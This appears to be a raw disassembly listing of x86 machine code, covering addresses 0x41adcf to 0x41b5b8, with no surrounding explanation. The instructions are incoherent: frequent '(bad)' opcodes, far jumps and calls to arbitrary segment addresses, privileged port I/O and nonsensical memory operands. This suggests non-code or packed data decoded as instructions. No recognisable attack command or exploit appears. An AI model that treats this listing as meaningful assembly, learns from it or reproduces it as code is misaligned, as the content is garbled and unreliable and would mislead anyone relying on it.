  41adcf:	jmp    DWORD PTR [eax]
  41add1:	dec    esi
  41add2:	fmul   st(7),st
  41add4:	mov    esp,0x1ae5370
  41add9:	xchg   esi,eax
  41adda:	xor    BYTE PTR [ebp-0x1f],ch
  41addd:	rol    BYTE PTR [edi],1
  41addf:	mov    al,ds:0x8cd5a8d3
  41ade4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ade5:	scas   eax,DWORD PTR es:[edi]
  41ade6:	xchg   BYTE PTR [eax],bl
  41ade8:	or     eax,0x2e535a9d
  41aded:	repz jcxz 0x41adbf
  41adf1:	test   al,0xea
  41adf3:	test   eax,0xf598707a
  41adf8:	dec    ecx
  41adf9:	pop    esp
  41adfa:	sbb    ebx,DWORD PTR [ebx-0x5f]
  41adfd:	aas    
  41adfe:	arpl   WORD PTR [edi+0x37],sp
  41ae01:	mov    eax,ds:0xc905a383
  41ae06:	fnstenv [edx-0x14]
  41ae09:	(bad)  
  41ae0a:	in     eax,0xe3
  41ae0c:	lahf   
  41ae0d:	mov    edi,0x9d537a7d
  41ae12:	jle    0x41ae5a
  41ae14:	lds    edi,FWORD PTR [esi-0x6b]
  41ae17:	pop    ss
  41ae18:	lock sub eax,0x77a10d26
  41ae1e:	arpl   WORD PTR [ecx],ax
  41ae20:	dec    ebx
  41ae21:	adc    DWORD PTR [ebp-0xc6b0995],eax
  41ae27:	dec    edi
  41ae28:	add    al,0xcd
  41ae2a:	out    0x3f,al
  41ae2c:	mov    cl,0x3e
  41ae2e:	inc    eax
  41ae2f:	ds int 0xc1
  41ae32:	stc    
  41ae33:	mov    bh,0xe6
  41ae35:	sbb    DWORD PTR [edi+0x7e2447dd],eax
  41ae3b:	sbb    edx,eax
  41ae3d:	sbb    esi,edi
  41ae3f:	ds mov ebp,0x4a8a8012
  41ae45:	xchg   edx,eax
  41ae46:	outs   dx,BYTE PTR ds:[esi]
  41ae47:	xor    dh,ch
  41ae49:	(bad)  
  41ae4a:	xchg   esi,eax
  41ae4b:	stc    
  41ae4c:	xor    esp,DWORD PTR [ebx+0x5a642c28]
  41ae52:	stc    
  41ae53:	jecxz  0x41ae78
  41ae55:	push   ebx
  41ae56:	ja     0x41ae68
  41ae58:	mov    cl,0xa9
  41ae5a:	loope  0x41ae71
  41ae5c:	mov    ds:0x12c5327a,eax
  41ae61:	gs mov dh,0x27
  41ae64:	dec    ecx
  41ae65:	or     al,0x3e
  41ae67:	aad    0x2d
  41ae69:	fldenv [esi-0x44]
  41ae6c:	jmp    0x47e1:0x14001f14
  41ae73:	mov    dl,0x48
  41ae75:	in     eax,0xbd
  41ae77:	sbb    DWORD PTR [esi-0x2c],edi
  41ae7a:	retf   0xa625
  41ae7d:	mov    edx,0x6953b897
  41ae82:	and    al,0x84
  41ae84:	and    esp,DWORD PTR [ecx]
  41ae86:	push   0x38
  41ae88:	aaa    
  41ae89:	cmp    BYTE PTR [esi],0xed
  41ae8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae8d:	(bad)  
  41ae8e:	jg     0x41ae59
  41ae90:	or     al,0x91
  41ae92:	scas   eax,DWORD PTR es:[edi]
  41ae93:	cmp    BYTE PTR [edx+0x35c7f570],0x1c
  41ae9a:	pop    edx
  41ae9b:	pop    esi
  41ae9c:	pop    edi
  41ae9d:	or     bl,cl
  41ae9f:	dec    ebx
  41aea0:	stc    
  41aea1:	xor    ebx,ebx
  41aea3:	xchg   esi,eax
  41aea4:	stos   BYTE PTR es:[edi],al
  41aea5:	dec    edx
  41aea6:	in     eax,0xfd
  41aea8:	cvtpi2ps xmm2,QWORD PTR [edi+0x48]
  41aeac:	cmp    dh,BYTE PTR [esi+0x7f91e155]
  41aeb2:	sbb    dl,BYTE PTR [ebp-0x696a7283]
  41aeb8:	sub    bl,BYTE PTR [eax+0x60]
  41aebb:	ror    DWORD PTR [eax+0x5014b33d],cl
  41aec1:	xor    BYTE PTR [ebp-0x63],0x1b
  41aec5:	mov    ds:0xa6dcff19,eax
  41aeca:	addr16 fwait
  41aecc:	jae    0x41ae61
  41aece:	cmp    edx,DWORD PTR [edi]
  41aed0:	adc    DWORD PTR [ecx],0xffffff8a
  41aed3:	cmp    eax,0x2afa35d7
  41aed8:	and    eax,DWORD PTR [ebx+0x13c226d5]
  41aede:	push   eax
  41aedf:	fstp   st(1)
  41aee1:	in     al,dx
  41aee2:	retf   
  41aee3:	xor    eax,0x179c9c73
  41aee8:	xchg   DWORD PTR [ecx+0x61],ebx
  41aeeb:	xchg   ebp,eax
  41aeec:	les    ebp,FWORD PTR [edx+0x482e29bc]
  41aef2:	inc    esi
  41aef3:	fnstenv [ecx-0x2a]
  41aef6:	mov    cl,BYTE PTR [ebp-0x7c]
  41aef9:	pop    ebx
  41aefa:	and    BYTE PTR [ebx],ah
  41aefc:	sbb    ecx,DWORD PTR es:[ebx+0x28]
  41af00:	fstp   DWORD PTR [ebp+0x68]
  41af03:	dec    edx
  41af04:	push   ecx
  41af05:	fst    QWORD PTR [edx+0x4562a663]
  41af0b:	sbb    eax,0x7b52c24
  41af10:	test   DWORD PTR [ebp+0x1944900e],edx
  41af16:	push   edi
  41af17:	inc    esi
  41af18:	xor    eax,0xf13a2f1c
  41af1d:	addr16 call 0xc67f:0x65c3997b
  41af25:	leave  
  41af26:	xchg   ecx,eax
  41af27:	shl    BYTE PTR [eax+0x71],cl
  41af2a:	fwait
  41af2b:	jmp    FWORD PTR [edx+0x2f545335]
  41af31:	jg     0x41aec7
  41af33:	mov    ebp,0x5f171848
  41af38:	and    eax,0x428ca0f1
  41af3d:	cmp    ch,bl
  41af3f:	nop
  41af40:	leave  
  41af41:	ja     0x41af16
  41af43:	xor    ah,BYTE PTR [edx-0x6ffd38b8]
  41af49:	stos   BYTE PTR es:[edi],al
  41af4a:	imul   ebx,DWORD PTR [ebp-0x5d],0xffffff98
  41af4e:	mov    ebp,0x9d78bf07
  41af53:	ret    0x2cef
  41af56:	jg     0x41af01
  41af58:	mov    edx,0xb63e1f7e
  41af5d:	mov    al,0xe9
  41af5f:	mov    eax,ds:0xfa92db45
  41af64:	ja     0x41afb5
  41af66:	xor    BYTE PTR fs:[eax],bl
  41af69:	mov    esp,0xcaa79535
  41af6e:	lea    ecx,[di-0x2afd]
  41af73:	in     al,dx
  41af74:	sub    ebp,edx
  41af76:	stc    
  41af77:	xlat   BYTE PTR ds:[ebx]
  41af78:	mov    ?,WORD PTR [edi]
  41af7a:	jbe    0x41af32
  41af7c:	jmp    0x258:0xd80cc33a
  41af83:	mov    bl,0x6d
  41af85:	dec    edx
  41af86:	cdq    
  41af87:	jmp    0x26d6275
  41af8c:	nop
  41af8d:	iret   
  41af8e:	push   0xffffffe2
  41af90:	jno    0x41af5a
  41af92:	repz cs sub al,0x2a
  41af96:	push   ebx
  41af97:	add    dh,BYTE PTR [ebp+0x655feccb]
  41af9d:	into   
  41af9e:	mov    edi,0xe0576028
  41afa3:	ins    WORD PTR es:[edi],dx
  41afa5:	ins    DWORD PTR es:[edi],dx
  41afa6:	xchg   edx,eax
  41afa7:	enter  0xebce,0x42
  41afab:	icebp  
  41afac:	sub    BYTE PTR [edx-0x18],0x2d
  41afb0:	ror    BYTE PTR [esi],1
  41afb2:	loope  0x41afb7
  41afb4:	(bad)  
  41afb6:	push   0xffffffbd
  41afb8:	es add eax,0xcd32bb1d
  41afbe:	(bad)
  41afc1:	aas    
  41afc2:	es call 0x5090:0xfd379906
  41afca:	out    0x2f,eax
  41afcc:	inc    edi
  41afcd:	(bad)  
  41afce:	pusha  
  41afcf:	sbb    BYTE PTR [edi+edi*1],0xbc
  41afd3:	or     BYTE PTR [edx+ebx*4],ah
  41afd6:	jmp    0xbf5d:0x60ba606a
  41afdd:	call   0x4c45:0x6590ad41
  41afe4:	fisubr WORD PTR [ebx]
  41afe6:	sub    esp,DWORD PTR [edx+edx*8-0x65]
  41afea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afeb:	sbb    edi,DWORD PTR [ecx+0x37e265de]
  41aff1:	mov    ds:0x701f50a2,eax
  41aff6:	xor    eax,0x8df00edc
  41affb:	and    al,0x68
  41affd:	pusha  
  41affe:	inc    edx
  41afff:	add    BYTE PTR [edx+0x46dc134b],bl
  41b005:	mov    DWORD PTR [esi-0x37cff589],ecx
  41b00b:	ftst   
  41b00d:	call   0xede:0xbcb5d23e
  41b014:	push   eax
  41b015:	adc    DWORD PTR [ebp-0x67],ebx
  41b018:	dec    ebx
  41b019:	pop    edx
  41b01a:	or     DWORD PTR [eax-0x59c7beb9],0x65ee1a3b
  41b024:	xor    esp,DWORD PTR [ebp+0x33]
  41b027:	(bad)
  41b02a:	mov    al,ds:0x6f01a1c7
  41b02f:	mov    ebx,0x1f1a05ff
  41b034:	add    eax,0xc8f662f1
  41b039:	pop    edi
  41b03a:	outs   dx,DWORD PTR ds:[esi]
  41b03b:	push   edi
  41b03c:	jno    0x41afce
  41b03e:	and    cl,BYTE PTR [esi-0x3411ae77]
  41b044:	and    ecx,DWORD PTR [edx+0x75]
  41b047:	out    dx,al
  41b048:	jne    0x41b01d
  41b04a:	xchg   edx,eax
  41b04b:	pop    esi
  41b04c:	cmp    ecx,eax
  41b04e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b04f:	xor    eax,DWORD PTR [ecx+edi*8+0x2b]
  41b053:	mul    ch
  41b055:	dec    edx
  41b056:	leave  
  41b057:	cwde   
  41b058:	lea    ecx,[ebx+eax*8-0x64]
  41b05c:	mov    DWORD PTR [edi+0x1c],eax
  41b05f:	in     eax,0x90
  41b061:	repz (bad) 
  41b063:	cmp    bl,BYTE PTR [edx+0x17f94c4c]
  41b069:	sbb    DWORD PTR [edi-0x528327ac],edx
  41b06f:	push   esi
  41b070:	push   ss
  41b071:	jno    0x41aff4
  41b073:	push   ebx
  41b074:	lds    esi,FWORD PTR [edx+0x6a1826d9]
  41b07a:	scas   eax,DWORD PTR es:[edi]
  41b07b:	dec    esi
  41b07c:	mov    al,0x33
  41b07e:	fcomp  st(6)
  41b080:	imul   ebx,eax,0x15b2992c
  41b086:	lods   al,BYTE PTR ds:[esi]
  41b087:	dec    edx
  41b088:	push   DWORD PTR [esi+0x76cb259e]
  41b08e:	fnstcw WORD PTR fs:[esi]
  41b091:	xchg   ecx,eax
  41b092:	es push ecx
  41b094:	jg     0x41b0bf
  41b096:	xor    DWORD PTR [ecx-0xb1712e3],edx
  41b09c:	shr    DWORD PTR [edi],cl
  41b09e:	test   al,0x13
  41b0a0:	and    bl,BYTE PTR [esi+0x4d]
  41b0a3:	pop    ecx
  41b0a4:	idiv   BYTE PTR [edx-0x3b]
  41b0a7:	mov    eax,0xc9b6f133
  41b0ac:	mov    WORD PTR ds:0x4992a3f1,es
  41b0b2:	dec    edi
  41b0b3:	xor    eax,0xb183233e
  41b0b8:	adc    DWORD PTR [ecx+0x3c413628],esp
  41b0be:	push   ebx
  41b0bf:	mov    eax,ds:0xdd6d47c4
  41b0c4:	outs   dx,DWORD PTR ds:[esi]
  41b0c5:	arpl   WORD PTR [edi+0xd088c68],ax
  41b0cb:	push   edi
  41b0cc:	dec    edx
  41b0cd:	clc    
  41b0ce:	jecxz  0x41b0b0
  41b0d0:	ror    DWORD PTR [ecx+0x37],1
  41b0d3:	and    edx,0x61
  41b0d6:	aad    0xab
  41b0d8:	mov    ah,0x8a
  41b0da:	inc    edx
  41b0db:	mov    ds:0x2ed73f9a,eax
  41b0e0:	cmp    BYTE PTR [eax],cl
  41b0e2:	popa   
  41b0e3:	idiv   DWORD PTR [ebx]
  41b0e5:	(bad)  
  41b0e6:	cmp    al,BYTE PTR [edx-0x74]
  41b0e9:	add    DWORD PTR [ecx+0x20],esp
  41b0ec:	push   ebx
  41b0ed:	mov    dl,0x13
  41b0ef:	jmp    0x867a7a0d
  41b0f4:	add    edi,DWORD PTR [esi+0x33]
  41b0f7:	aaa    
  41b0f8:	pusha  
  41b0f9:	loope  0x41b107
  41b0fb:	ja     0x41b0df
  41b0fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0fe:	ins    DWORD PTR es:[edi],dx
  41b0ff:	pop    ecx
  41b100:	shl    DWORD PTR [edi],0xff
  41b103:	jmp    0x73fa54e3
  41b108:	cwde   
  41b109:	mov    eax,ds:0x91d90eb8
  41b10e:	scas   eax,DWORD PTR es:[edi]
  41b10f:	mov    ch,0x57
  41b111:	dec    ebx
  41b112:	rol    BYTE PTR [esi],cl
  41b114:	mov    eax,ds:0x2de95218
  41b119:	sbb    dl,BYTE PTR [esi]
  41b11b:	aas    
  41b11c:	cmp    edi,esp
  41b11e:	jo     0x41b0dc
  41b120:	sub    eax,0xb3633077
  41b125:	(bad)  
  41b126:	pop    esp
  41b127:	sub    cl,BYTE PTR [ecx*2+0x1506cd63]
  41b12e:	daa    
  41b12f:	fwait
  41b130:	rol    DWORD PTR [ebx+eax*8+0x535128a],cl
  41b137:	sub    al,0x5c
  41b139:	popa   
  41b13a:	add    eax,DWORD PTR [eax]
  41b13c:	adc    al,0x3
  41b13e:	retf   0x9acc
  41b141:	xchg   esp,eax
  41b142:	aam    0xcb
  41b144:	aaa    
  41b145:	dec    eax
  41b146:	pop    edi
  41b147:	call   0xcaba3243
  41b14c:	nop
  41b14d:	leave  
  41b14e:	mov    edi,0xb21c8fe3
  41b153:	dec    ebx
  41b154:	cmp    al,0x35
  41b156:	sbb    ah,BYTE PTR [ebp+0x21f11039]
  41b15c:	adc    BYTE PTR [ebx+eax*1+0x4676afe3],al
  41b163:	frstor [edx+0x3a46214]
  41b169:	or     DWORD PTR ds:0xecd79cf0,esi
  41b16f:	xchg   BYTE PTR [edi+0x33],dl
  41b172:	jmp    0x420640
	...
  41b17f:	add    BYTE PTR [eax],al
  41b181:	jecxz  0x41b16b
  41b183:	nop
  41b184:	rcr    BYTE PTR [ebx+0x79fbe3f8],1
  41b18a:	dec    edx
  41b18b:	shr    ebp,0xfd
  41b18e:	inc    DWORD PTR [edi-0x19]
  41b191:	shr    DWORD PTR [esi],0x1
  41b194:	add    BYTE PTR [ebx+eax*1-0x20ae0000],ch
  41b19b:	(bad)  [ebx]
  41b19e:	call   0x6c76:0x631164d1
  41b1a5:	gs popa 
  41b1a7:	mov    esp,0xd5bc8deb
  41b1ac:	mov    BYTE PTR [ecx],dl
  41b1ae:	int    0x46
  41b1b0:	and    ebp,0xe6e7daa0
  41b1b6:	call   0xcf57:0x3d2ae97f
  41b1bd:	jae    0x41b158
  41b1bf:	xchg   ecx,eax
  41b1c0:	mov    ebp,0xa525d683
  41b1c5:	inc    esi
  41b1c6:	dec    eax
  41b1c7:	pop    edx
  41b1c8:	(bad)  
  41b1ca:	sub    al,0x18
  41b1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1cd:	sub    al,0x40
  41b1cf:	scas   al,BYTE PTR es:[edi]
  41b1d0:	mov    ebx,DWORD PTR [bx+di]
  41b1d3:	and    ebp,ecx
  41b1d5:	or     al,0x8f
  41b1d7:	xor    BYTE PTR [esi-0x3d],dh
  41b1da:	push   ecx
  41b1db:	out    0xd4,al
  41b1dd:	in     eax,0xc5
  41b1df:	(bad)  
  41b1e0:	and    al,cl
  41b1e2:	es fsubr st,st(4)
  41b1e5:	(bad)  
  41b1e7:	es mov ch,0xe6
  41b1ea:	in     eax,dx
  41b1eb:	mul    DWORD PTR [ebp+0x13]
  41b1ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ef:	fsubr  DWORD PTR ds:0xce2a1142
  41b1f6:	pushf  
  41b1f7:	ret    0x3a90
  41b1fa:	inc    ebx
  41b1fb:	mov    ebp,0x9f3a53f
  41b200:	sub    DWORD PTR [esi+0x32],esi
  41b203:	das    
  41b204:	stc    
  41b205:	lahf   
  41b206:	in     eax,0x20
  41b208:	mov    ds:0x5c0b326d,eax
  41b20d:	lahf   
  41b20e:	sahf   
  41b20f:	es fxch st(7)
  41b212:	enter  0x3a42,0x8a
  41b216:	sub    eax,0xa39750d0
  41b21b:	adc    ah,BYTE PTR ss:[ecx-0x4ef5fb5d]
  41b222:	pop    ebp
  41b223:	fldenv [edi]
  41b225:	lock addr16 or al,0x5
  41b229:	cmp    DWORD PTR [eax],ebx
  41b22b:	dec    ebp
  41b22c:	lock sbb ecx,DWORD PTR [ecx+ecx*1+0x37]
  41b231:	lahf   
  41b232:	xor    dl,cl
  41b234:	cmp    BYTE PTR [eax+0x4c94aef9],dh
  41b23a:	push   cs
  41b23b:	inc    esi
  41b23c:	adc    esi,DWORD PTR [ebp+0x75]
  41b23f:	in     al,dx
  41b240:	pop    edx
  41b241:	jmp    0xbaf61ec0
  41b246:	or     dl,dh
  41b248:	ror    BYTE PTR [ebp+eax*1-0x447493de],0xb
  41b250:	aaa    
  41b251:	repnz cmp al,BYTE PTR ds:0x512b7455
  41b258:	add    BYTE PTR ds:0x7bae522a,ah
  41b25e:	sbb    BYTE PTR fs:[eax+0x44282cfa],dl
  41b265:	xchg   ah,ch
  41b267:	popa   
  41b268:	push   0xdfbba87c
  41b26d:	xchg   esp,eax
  41b26e:	aam    0x43
  41b270:	in     eax,0x2e
  41b272:	mov    WORD PTR ds:0x60f9f2ae,gs
  41b278:	mov    bl,0x60
  41b27a:	add    eax,0x20d63780
  41b27f:	mov    tr6,esp
  41b282:	sub    DWORD PTR [edi+ecx*8-0x13],ebp
  41b286:	mov    fs,WORD PTR [esi+0xfbc7380]
  41b28c:	fisub  WORD PTR [ebp-0x4f]
  41b28f:	push   esi
  41b290:	jbe    0x41b2b1
  41b292:	fdivrp st(6),st
  41b294:	pop    eax
  41b295:	adc    eax,0x82de6f5
  41b29a:	test   BYTE PTR [ecx+0x12],0x27
  41b29e:	fistp  QWORD PTR [ecx-0x2d]
  41b2a1:	pop    edx
  41b2a2:	pop    ss
  41b2a3:	pop    esi
  41b2a4:	add    eax,0x991ab595
  41b2a9:	leave  
  41b2aa:	fadd   DWORD PTR [eax-0x5f]
  41b2ad:	pop    es
  41b2ae:	aaa    
  41b2af:	pop    ss
  41b2b0:	pop    ecx
  41b2b1:	aaa    
  41b2b2:	mov    bl,0xdb
  41b2b4:	inc    edx
  41b2b5:	pop    ecx
  41b2b6:	jb     0x41b2ff
  41b2b8:	jl     0x41b335
  41b2ba:	pop    es
  41b2bb:	add    BYTE PTR [ecx],ch
  41b2bd:	frstor [edi]
  41b2bf:	or     bl,ch
  41b2c1:	ins    BYTE PTR es:[edi],dx
  41b2c2:	jl     0x41b2ae
  41b2c4:	lea    esp,[edx+0x65]
  41b2c7:	sub    BYTE PTR [ecx],ch
  41b2c9:	call   0x8715:0x97a9d993
  41b2d0:	pop    ebx
  41b2d1:	pop    ecx
  41b2d2:	out    dx,eax
  41b2d3:	lods   al,BYTE PTR ds:[esi]
  41b2d4:	arpl   WORD PTR [ebx],si
  41b2d6:	aas    
  41b2d7:	push   0x34
  41b2d9:	call   0x2663ba79
  41b2de:	sbb    bl,BYTE PTR [esi]
  41b2e0:	xor    BYTE PTR [edi],al
  41b2e2:	es mov ebp,0xc00d9e74
  41b2e8:	jns    0x41b2cb
  41b2ea:	and    ebp,DWORD PTR [ebp-0x28]
  41b2ed:	scas   eax,DWORD PTR es:[edi]
  41b2ee:	cmp    al,0xd3
  41b2f0:	out    dx,eax
  41b2f1:	jbe    0x41b341
  41b2f3:	jecxz  0x41b2b1
  41b2f5:	jae    0x41b34a
  41b2f7:	jno    0x41b2e4
  41b2f9:	ss pop ebp
  41b2fb:	pushf  
  41b2fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2fd:	sbb    edi,DWORD PTR [esi]
  41b2ff:	test   eax,0xd16f7527
  41b304:	sti    
  41b305:	pop    edi
  41b306:	(bad)
  41b309:	scas   al,BYTE PTR es:[edi]
  41b30a:	mov    esi,0x75ea61a4
  41b30f:	fstp   QWORD PTR [ecx]
  41b311:	push   cs
  41b312:	and    esi,ecx
  41b314:	in     eax,0x7d
  41b316:	shl    BYTE PTR [edi-0x2d6eca0d],1
  41b31c:	mov    cl,0xd0
  41b31e:	es mov dl,0xb2
  41b321:	outs   dx,DWORD PTR ds:[esi]
  41b322:	jo     0x41b360
  41b324:	and    dh,BYTE PTR [ebx+0x5e]
  41b327:	in     eax,0xa2
  41b329:	lock sbb al,0x8c
  41b32c:	gs push es
  41b32e:	es xchg ebp,eax
  41b330:	sub    bl,BYTE PTR [edx-0x11476fa7]
  41b336:	rol    DWORD PTR ds:[edx],1
  41b339:	push   esi
  41b33a:	add    al,0x6c
  41b33c:	cwde   
  41b33d:	mov    ah,BYTE PTR [esi-0x542b46b7]
  41b343:	int3   
  41b344:	sub    al,0xd7
  41b346:	xchg   esp,eax
  41b347:	clc    
  41b348:	nop
  41b349:	aam    0x99
  41b34b:	inc    eax
  41b34c:	sub    eax,0xfcd9afd5
  41b351:	enter  0xa890,0x6d
  41b355:	dec    edi
  41b356:	hlt    
  41b357:	and    eax,0x145e89be
  41b35c:	rcl    DWORD PTR [esi-0x2e],0xf7
  41b360:	or     ebp,edi
  41b362:	retf   
  41b363:	call   0x6afe4f38
  41b368:	imul   esi,DWORD PTR [ebx-0x9],0x4e
  41b36c:	jnp    0x41b3a9
  41b36e:	shr    BYTE PTR [ebp-0x2df6a0d3],0x95
  41b375:	jge    0x41b3a9
  41b377:	xor    al,0x9e
  41b379:	stos   BYTE PTR es:[edi],al
  41b37a:	in     eax,dx
  41b37b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b37c:	(bad)
  41b37f:	loope  0x41b341
  41b381:	pushf  
  41b382:	xchg   ebp,eax
  41b383:	shl    DWORD PTR [edi],1
  41b385:	sub    al,BYTE PTR [esi+esi*4-0x40956b90]
  41b38c:	imul   edx,ecx,0x612b0a94
  41b392:	fbld   TBYTE PTR [ecx+0x5eac1ece]
  41b398:	adc    DWORD PTR [edx+ebp*1-0x6d],edx
  41b39c:	in     al,dx
  41b39d:	sbb    eax,DWORD PTR [edx+0x3ef81688]
  41b3a3:	call   0xa05:0x1b4b438f
  41b3aa:	add    al,0x1
  41b3ac:	push   ss
  41b3ad:	hlt    
  41b3ae:	test   al,0x68
  41b3b0:	push   0xfeb35933
  41b3b5:	(bad)  
  41b3b6:	mov    cs,WORD PTR [edx+eax*8]
  41b3b9:	pop    edi
  41b3ba:	out    0xf9,eax
  41b3bc:	sar    BYTE PTR [ecx],1
  41b3be:	adc    esi,DWORD PTR [edx-0x78]
  41b3c1:	clc    
  41b3c2:	ror    dl,cl
  41b3c4:	pushf  
  41b3c5:	xchg   DWORD PTR [edi],edx
  41b3c7:	ss lock mov bl,0xec
  41b3cb:	fld    DWORD PTR [eax+0x7a509171]
  41b3d1:	pop    eax
  41b3d2:	ficomp WORD PTR [esi+ecx*4]
  41b3d5:	jmp    0x4080:0x849c8bd5
  41b3dc:	test   al,0x72
  41b3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3df:	pop    ss
  41b3e0:	ss mov ecx,0x278b80bd
  41b3e6:	jno    0x41b439
  41b3e8:	inc    ebp
  41b3e9:	lods   eax,DWORD PTR ds:[esi]
  41b3ea:	push   edi
  41b3eb:	lods   al,BYTE PTR ds:[esi]
  41b3ec:	fbstp  TBYTE PTR [edi+0x55]
  41b3ef:	mov    dh,0x40
  41b3f1:	pop    eax
  41b3f2:	aam    0x3d
  41b3f4:	inc    esi
  41b3f5:	imul   eax,DWORD PTR [edx-0x6a],0x819cb7a
  41b3fc:	mov    dl,0x11
  41b3fe:	in     eax,0x45
  41b400:	and    DWORD PTR [ebx+0x1eb72fbd],ecx
  41b406:	jp     0x41b40a
  41b408:	cs jge 0x41b3d1
  41b40b:	pop    ecx
  41b40c:	mov    dl,0x6f
  41b40e:	dec    edx
  41b40f:	cmp    eax,0x184b917f
  41b414:	mov    ecx,0xa3ab04d7
  41b419:	cmp    edx,DWORD PTR ds:0x3b466757
  41b41f:	ficomp WORD PTR [ebp+0x3e1f14c5]
  41b425:	xor    al,BYTE PTR [ecx-0x10]
  41b428:	jmp    0x57fb034c
  41b42d:	cs popf 
  41b42f:	in     eax,dx
  41b430:	fstp   st(7)
  41b432:	dec    ecx
  41b433:	leave  
  41b434:	imul   ebp,DWORD PTR [eax+0x40],0xc6b82c40
  41b43b:	cmp    eax,0x9de909f5
  41b440:	es test eax,0x4e7260d8
  41b446:	enter  0x6896,0xf6
  41b44a:	or     eax,0xb18974a9
  41b44f:	or     DWORD PTR [edi+0x39],esp
  41b452:	lods   eax,DWORD PTR ds:[esi]
  41b453:	ss inc ebp
  41b455:	or     edi,edx
  41b457:	data16 hlt 
  41b459:	adc    al,0xae
  41b45b:	pop    ecx
  41b45c:	dec    DWORD PTR [edi]
  41b45e:	inc    esp
  41b45f:	pop    ebp
  41b460:	fsub   QWORD PTR [ecx+eax*4-0x1177c053]
  41b467:	xchg   ecx,edi
  41b469:	or     BYTE PTR [esi],dh
  41b46b:	clc    
  41b46c:	ja     0x41b3fd
  41b46e:	fstp   QWORD PTR [ecx]
  41b470:	jp     0x41b498
  41b472:	xor    ebp,esp
  41b474:	inc    esi
  41b475:	xchg   edi,edi
  41b477:	ds call 0xb864d1d0
  41b47d:	cdq    
  41b47e:	fs xchg ebp,eax
  41b480:	daa    
  41b481:	hlt    
  41b482:	es push esi
  41b484:	repnz aas 
  41b486:	sub    eax,0xd3779371
  41b48b:	mov    ebx,0x45f4fa49
  41b490:	jl     0x41b4ee
  41b492:	es xchg ecx,eax
  41b494:	arpl   WORD PTR [ebx+0x64],bp
  41b497:	jp     0x41b460
  41b499:	add    al,0x3f
  41b49b:	mov    ebp,0xebc8731f
  41b4a0:	cmc    
  41b4a1:	sldt   WORD PTR [ebx+eax*4+0x7e83cf4b]
  41b4a9:	and    esi,DWORD PTR [edi]
  41b4ab:	aas    
  41b4ac:	mov    edi,0xac5091c2
  41b4b1:	sbb    ebx,DWORD PTR [edi+0x54]
  41b4b4:	jb     0x41b523
  41b4b6:	or     dl,BYTE PTR [ebp-0x637cf78]
  41b4bc:	mov    ah,0x7c
  41b4be:	or     ecx,eax
  41b4c0:	add    cl,BYTE PTR [edi-0x6f]
  41b4c3:	inc    ebp
  41b4c4:	aas    
  41b4c5:	push   ss
  41b4c6:	fisttp DWORD PTR [esi]
  41b4c8:	mov    esp,0x1a32a5d0
  41b4cd:	bound  ecx,QWORD PTR [ebx+esi*4]
  41b4d0:	gs ret 
  41b4d2:	adc    DWORD PTR [ebp-0x43],ecx
  41b4d5:	iret   
  41b4d6:	aad    0x55
  41b4d8:	cmp    cl,BYTE PTR [edi]
  41b4da:	mov    ds:0xc2de9ebe,al
  41b4df:	aaa    
  41b4e0:	aas    
  41b4e1:	mov    edi,0x3882117f
  41b4e6:	lea    ebp,[edx+0x38]
  41b4e9:	jmp    0x28d6:0x9d4268ce
  41b4f0:	mov    eax,ds:0x80b0f18a
  41b4f5:	jbe    0x41b4a2
  41b4f7:	adc    eax,0x801008
  41b4fc:	(bad)  
  41b4fe:	xchg   esi,eax
  41b4ff:	xlat   BYTE PTR ds:[ebx]
  41b500:	push   ss
  41b501:	or     al,0xb0
  41b503:	ss mov dl,0xc8
  41b506:	mov    ebx,0x1ba41ea2
  41b50b:	mov    dh,0x9c
  41b50d:	adc    eax,0xf4eb0c6c
  41b512:	sub    DWORD PTR [ecx-0x455e9cf],ecx
  41b518:	cli    
  41b519:	push   edi
  41b51a:	aas    
  41b51b:	nop
  41b51c:	dec    edi
  41b51d:	not    DWORD PTR [ecx]
  41b51f:	sub    DWORD PTR [ebx+0x14],0xffffff92
  41b523:	sbb    edi,DWORD PTR [ebp+0x103bc7f1]
  41b529:	pop    ebx
  41b52a:	in     al,0x6b
  41b52c:	mov    dh,0x8
  41b52e:	xchg   bx,ax
  41b530:	rcr    bl,0x12
  41b533:	inc    ecx
  41b534:	xchg   esi,eax
  41b535:	sbb    BYTE PTR [edi],dh
  41b537:	jnp    0x41b506
  41b539:	sub    BYTE PTR [ebx],bh
  41b53b:	cmp    al,0x5f
  41b53d:	add    edx,DWORD PTR [ebp-0x58788856]
  41b543:	stc    
  41b544:	call   0x0:0x0
  41b54b:	add    BYTE PTR [eax],al
  41b54d:	add    BYTE PTR [eax],al
  41b54f:	add    BYTE PTR [eax],al
  41b551:	out    dx,al
  41b552:	data16 hlt 
  41b554:	lods   eax,DWORD PTR ds:[esi]
  41b555:	cld    
  41b556:	mov    edi,0xbcb067ff
  41b55b:	hlt    
  41b55c:	xor    eax,0x5d220bfb
  41b561:	ins    DWORD PTR es:[edi],dx
  41b562:	xor    al,BYTE PTR [ecx]
  41b564:	add    BYTE PTR [ebx+eax*1-0x2a140000],ch
  41b56b:	mov    ebx,0x2e93f69e
  41b570:	and    BYTE PTR ds:0xd8b93e06,0xfb
  41b577:	dec    ecx
  41b578:	push   cs
  41b579:	sub    DWORD PTR [edi-0x10a988bb],ebx
  41b57f:	dec    ebp
  41b580:	jg     0x41b522
  41b582:	into   
  41b583:	enter  0x76d2,0xd2
  41b587:	mov    ebp,0xfe675d8
  41b58c:	aas    
  41b58d:	mov    cl,0x17
  41b58f:	cmp    bh,ch
  41b591:	add    DWORD PTR [edi+eax*1-0x4e],esp
  41b595:	outs   dx,BYTE PTR ds:[esi]
  41b596:	call   0x1ac:0x16fc6c81
  41b59d:	pop    eax
  41b59e:	and    eax,0xfc80bbf3
  41b5a3:	cmp    BYTE PTR [ebp-0x561a6edd],0x61
  41b5aa:	xor    eax,0x4c7841b6
  41b5af:	mov    esi,0xb81d699f
  41b5b4:	cmp    bh,ch
  41b5b6:	mov    dl,0xbd
  41b5b8:	add    BYTE PTR [edx+0x5c8353d1],bl
